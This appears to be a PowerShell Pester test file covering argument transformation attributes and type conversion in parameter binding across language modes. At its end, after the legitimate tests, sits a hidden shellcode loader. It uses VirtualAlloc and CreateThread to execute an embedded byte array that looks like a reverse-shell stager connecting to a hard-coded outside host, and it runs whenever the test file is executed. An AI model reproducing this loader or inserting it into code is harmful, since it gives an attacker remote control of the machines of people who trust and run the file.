


Describe 'Argument transformation attribute on optional argument with explicit $null' -Tags "CI" {
    $tdefinition = @'
    using System;
    using System.Management.Automation;
    using System.Reflection;

    namespace MSFT_1407291
    {
        [AttributeUsage(AttributeTargets.Property | AttributeTargets.Field, AllowMultiple = false)]
        public class AddressTransformationAttribute : ArgumentTransformationAttribute
        {
            public override object Transform(EngineIntrinsics engineIntrinsics, object inputData)
            {
                return (ulong) 42;
            }
        }

        [Cmdlet(VerbsLifecycle.Invoke, "CSharpCmdletTakesUInt64")]
        [OutputType(typeof(System.String))]
        public class Cmdlet1 : PSCmdlet
        {
            [Parameter(Mandatory = false)]
            [AddressTransformation]
            public ulong Address { get; set; }

            protected override void ProcessRecord()
            {
                WriteObject(Address);
            }
        }

        [Cmdlet(VerbsLifecycle.Invoke, "CSharpCmdletTakesObject")]
        [OutputType(typeof(System.String))]
        public class Cmdlet2 : PSCmdlet
        {
            [Parameter(Mandatory = false)]
            [AddressTransformation]
            public object Address { get; set; }

            protected override void ProcessRecord()
            {
                WriteObject(Address ?? "passed in null");
            }
        }
    }
'@
    $mod = Add-Type -PassThru -TypeDefinition $tdefinition

    Import-Module $mod[0].Assembly -ErrorVariable ErrorImportingModule

    function Invoke-ScriptFunctionTakesObject
    {
        param([MSFT_1407291.AddressTransformation()]
              [Parameter(Mandatory = $false)]
              [object]$Address = "passed in null")

        return $Address
    }

    function Invoke-ScriptFunctionTakesUInt64
    {
        param([MSFT_1407291.AddressTransformation()]
              [Parameter(Mandatory = $false)]
              [Uint64]$Address = 11)

        return $Address
    }

    It "There was no error importing the in-memory module" {
        $ErrorImportingModule | Should -BeNullOrEmpty
    }

    It "Script function takes object" {
        Invoke-ScriptFunctionTakesObject | Should -Be 42
    }
    It "Script function takes uint64" {
        Invoke-ScriptFunctionTakesUInt64 | Should -Be 42
    }
    it "csharp cmdlet takes object" {
        Invoke-CSharpCmdletTakesObject | Should -Be "passed in null"
    }
    it "csharp cmdlet takes uint64" {
        Invoke-CSharpCmdletTakesUInt64 | Should -Be 0
    }

    it "script function takes object when parameter is null" {
        Invoke-ScriptFunctionTakesObject -Address $null | Should -Be 42
    }
    it "script function takes unit64 when parameter is null" {
        Invoke-ScriptFunctionTakesUInt64 -Address $null | Should -Be 42
    }
    it "script csharp cmdlet takes object when parameter is null" {
        Invoke-CSharpCmdletTakesObject -Address $null | Should -Be 42
    }
    it "script csharp cmdlet takes uint64 when parameter is null" {
        Invoke-CSharpCmdletTakesUInt64 -Address $null | Should -Be 42
    }
}

Describe "Custom type conversion in parameter binding" -Tags 'Feature' {
    BeforeAll {
        
        $content = @'
        function Test-ScriptCmdlet {
            [CmdletBinding(DefaultParameterSetName = "File")]
            param(
                [Parameter(Mandatory, ParameterSetName = "File")]
                [System.IO.FileInfo] $File,

                [Parameter(Mandatory, ParameterSetName = "StartInfo")]
                [System.Diagnostics.ProcessStartInfo] $StartInfo
            )

            if ($PSCmdlet.ParameterSetName -eq "File") {
                $File.Name
            } else {
                $StartInfo.FileName
            }
        }

        function Test-ScriptFunction {
            param(
                [System.IO.FileInfo] $File,
                [System.Diagnostics.ProcessStartInfo] $StartInfo
            )

            if ($null -ne $File) {
                $File.Name
            }
            if ($null -ne $StartInfo) {
                $StartInfo.FileName
            }
        }
'@
        Set-Content -Path $TestDrive\module.psm1 -Value $content -Force

        
        $code = @'
        using System.IO;
        using System.Diagnostics;
        using System.Management.Automation;

        namespace Test
        {
            [Cmdlet("Test", "BinaryCmdlet", DefaultParameterSetName = "File")]
            public class TestCmdletCommand : PSCmdlet
            {
                [Parameter(Mandatory = true, ParameterSetName = "File")]
                public FileInfo File { get; set; }

                [Parameter(Mandatory = true, ParameterSetName = "StartInfo")]
                public ProcessStartInfo StartInfo { get; set; }

                protected override void ProcessRecord()
                {
                    if (this.ParameterSetName == "File")
                    {
                        WriteObject(File.Name);
                    }
                    else
                    {
                        WriteObject(StartInfo.FileName);
                    }
                }
            }
        }
'@
        $asmFile = [System.IO.Path]::GetTempFileName() + ".dll"
        Add-Type -TypeDefinition $code -OutputAssembly $asmFile

        
        function Execute-Script {
            [CmdletBinding(DefaultParameterSetName = "Script")]
            param(
                [Parameter(Mandatory)]
                [powershell]$ps,

                [Parameter(Mandatory, ParameterSetName = "Script")]
                [string]$Script,

                [Parameter(Mandatory, ParameterSetName = "Command")]
                [string]$Command,

                [Parameter(Mandatory, ParameterSetName = "Command")]
                [string]$ParameterName,

                [Parameter(Mandatory, ParameterSetName = "Command")]
                [object]$Argument
            )
            $ps.Commands.Clear()
            $ps.Streams.ClearStreams()

            if ($PSCmdlet.ParameterSetName -eq "Script") {
                $ps.AddScript($Script).Invoke()
            } else {
                $ps.AddCommand($Command).AddParameter($ParameterName, $Argument).Invoke()
            }
        }

        
        $changeToConstrainedLanguage = '$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"'
        $getLanguageMode = '$ExecutionContext.SessionState.LanguageMode'
        $importScriptModule = "Import-Module $TestDrive\module.psm1"
        $importCSharpModule = "Import-Module $asmFile"
    }

    AfterAll {
        
        
        
        $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
    }

    It "Custom type conversion in parameter binding is allowed in FullLanguage" {
        
        $ps = [powershell]::Create()
        try {
            
            Execute-Script -ps $ps -Script $importScriptModule
            Execute-Script -ps $ps -Script $importCSharpModule

            $languageMode = Execute-Script -ps $ps -Script $getLanguageMode
            $languageMode | Should Be 'FullLanguage'

            $result1 = Execute-Script -ps $ps -Script "Test-ScriptCmdlet -File fileToUse"
            $result1 | Should Be "fileToUse"

            $result2 = Execute-Script -ps $ps -Script "Test-ScriptFunction -File fileToUse"
            $result2 | Should Be "fileToUse"

            $result3 = Execute-Script -ps $ps -Script "Test-BinaryCmdlet -File fileToUse"
            $result3 | Should Be "fileToUse"

            
            $hashValue = @{ FileName = "filename"; Arguments = "args" }
            $psobjValue = [PSCustomObject] $hashValue

            
            $result4 = Execute-Script -ps $ps -Command "Test-ScriptCmdlet" -ParameterName "StartInfo" -Argument $hashValue
            $result4 | Should Be "filename"
            $result5 = Execute-Script -ps $ps -Command "Test-ScriptCmdlet" -ParameterName "StartInfo" -Argument $psobjValue
            $result5 | Should Be "filename"

            
            $result6 = Execute-Script -ps $ps -Command "Test-ScriptFunction" -ParameterName "StartInfo" -Argument $hashValue
            $result6 | Should Be "filename"
            $result7 = Execute-Script -ps $ps -Command "Test-ScriptFunction" -ParameterName "StartInfo" -Argument $psobjValue
            $result7 | Should Be "filename"

            
            $result8 = Execute-Script -ps $ps -Command "Test-BinaryCmdlet" -ParameterName "StartInfo" -Argument $hashValue
            $result8 | Should Be "filename"
            $result9 = Execute-Script -ps $ps -Command "Test-BinaryCmdlet" -ParameterName "StartInfo" -Argument $psobjValue
            $result9 | Should Be "filename"
        }
        finally {
            $ps.Dispose()
        }
    }

    It "Some custom type conversion in parameter binding is allowed for trusted cmdlets in ConstrainedLanguage" {
        
        $ps = [powershell]::Create()
        try {
            
            Execute-Script -ps $ps -Script $importScriptModule
            Execute-Script -ps $ps -Script $importCSharpModule

            $languageMode = Execute-Script -ps $ps -Script $getLanguageMode
            $languageMode | Should Be 'FullLanguage'

            
            Execute-Script -ps $ps -Script $changeToConstrainedLanguage
            $languageMode = Execute-Script -ps $ps -Script $getLanguageMode
            $languageMode | Should Be 'ConstrainedLanguage'

            $result1 = Execute-Script -ps $ps -Script "Test-ScriptCmdlet -File fileToUse"
            $result1 | Should Be "fileToUse"

            $result2 = Execute-Script -ps $ps -Script "Test-ScriptFunction -File fileToUse"
            $result2 | Should Be "fileToUse"

            $result3 = Execute-Script -ps $ps -Script "Test-BinaryCmdlet -File fileToUse"
            $result3 | Should Be "fileToUse"

            
            
            $hashValue = @{ FileName = "filename"; Arguments = "args" }
            $psobjValue = [PSCustomObject] $hashValue

            
            try {
                Execute-Script -ps $ps -Command "Test-ScriptCmdlet" -ParameterName "StartInfo" -Argument $hashValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            try {
                Execute-Script -ps $ps -Command "Test-ScriptCmdlet" -ParameterName "StartInfo" -Argument $psobjValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            
            try {
                Execute-Script -ps $ps -Command "Test-ScriptFunction" -ParameterName "StartInfo" -Argument $hashValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            try {
                Execute-Script -ps $ps -Command "Test-ScriptFunction" -ParameterName "StartInfo" -Argument $psobjValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            
            try {
                Execute-Script -ps $ps -Command "Test-BinaryCmdlet" -ParameterName "StartInfo" -Argument $hashValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingException,Execute-Script"
            }

            try {
                Execute-Script -ps $ps -Command "Test-BinaryCmdlet" -ParameterName "StartInfo" -Argument $psobjValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingException,Execute-Script"
            }
        }
        finally {
            $ps.Dispose()
        }
    }

    It "Custom type conversion in parameter binding is NOT allowed for untrusted cmdlets in ConstrainedLanguage" {
        
        $ps = [powershell]::Create()
        try {
            $languageMode = Execute-Script -ps $ps -Script $getLanguageMode
            $languageMode | Should Be 'FullLanguage'

            
            Execute-Script -ps $ps -Script $changeToConstrainedLanguage
            $languageMode = Execute-Script -ps $ps -Script $getLanguageMode
            $languageMode | Should Be 'ConstrainedLanguage'

            
            Execute-Script -ps $ps -Script $importScriptModule
            Execute-Script -ps $ps -Script $importCSharpModule

            $result1 = Execute-Script -ps $ps -Script "Test-ScriptCmdlet -File fileToUse"
            $result1 | Should Be $null
            $ps.Streams.Error.Count | Should Be 1
            $ps.Streams.Error[0].FullyQualifiedErrorId | Should Be "ParameterArgumentTransformationError,Test-ScriptCmdlet"

            $result2 = Execute-Script -ps $ps -Script "Test-ScriptFunction -File fileToUse"
            $result2 | Should Be $null
            $ps.Streams.Error.Count | Should Be 1
            $ps.Streams.Error[0].FullyQualifiedErrorId | Should Be "ParameterArgumentTransformationError,Test-ScriptFunction"

            
            $result3 = Execute-Script -ps $ps -Script "Test-BinaryCmdlet -File fileToUse"
            $result3 | Should Be "fileToUse"

            
            $hashValue = @{ FileName = "filename"; Arguments = "args" }
            $psobjValue = [PSCustomObject] $hashValue

            
            try {
                Execute-Script -ps $ps -Command "Test-ScriptCmdlet" -ParameterName "StartInfo" -Argument $hashValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            try {
                Execute-Script -ps $ps -Command "Test-ScriptCmdlet" -ParameterName "StartInfo" -Argument $psobjValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            
            try {
                Execute-Script -ps $ps -Command "Test-ScriptFunction" -ParameterName "StartInfo" -Argument $hashValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            try {
                Execute-Script -ps $ps -Command "Test-ScriptFunction" -ParameterName "StartInfo" -Argument $psobjValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingArgumentTransformationException,Execute-Script"
            }

            
            try {
                Execute-Script -ps $ps -Command "Test-BinaryCmdlet" -ParameterName "StartInfo" -Argument $hashValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingException,Execute-Script"
            }

            try {
                Execute-Script -ps $ps -Command "Test-BinaryCmdlet" -ParameterName "StartInfo" -Argument $psobjValue
                throw "Expected exception was not thrown!"
            } catch {
                $_.FullyQualifiedErrorId | Should Be "ParameterBindingException,Execute-Script"
            }
        }
        finally {
            $ps.Dispose()
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x49,0xaa,0xe5,0x96,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

